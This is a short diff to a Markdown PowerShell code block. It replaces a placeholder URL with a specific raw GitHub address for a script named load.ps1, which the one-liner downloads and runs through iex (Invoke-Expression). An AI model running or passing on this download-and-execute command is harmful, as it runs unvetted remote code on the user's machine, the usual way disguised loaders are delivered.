@@ -1,3 +1,3 @@
 ```powershell
-iex (New-Object Net.WebClient).DownloadString('https://url-to-your-script.com')
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/austnv/cs/refs/heads/master/load.ps1')
 ```
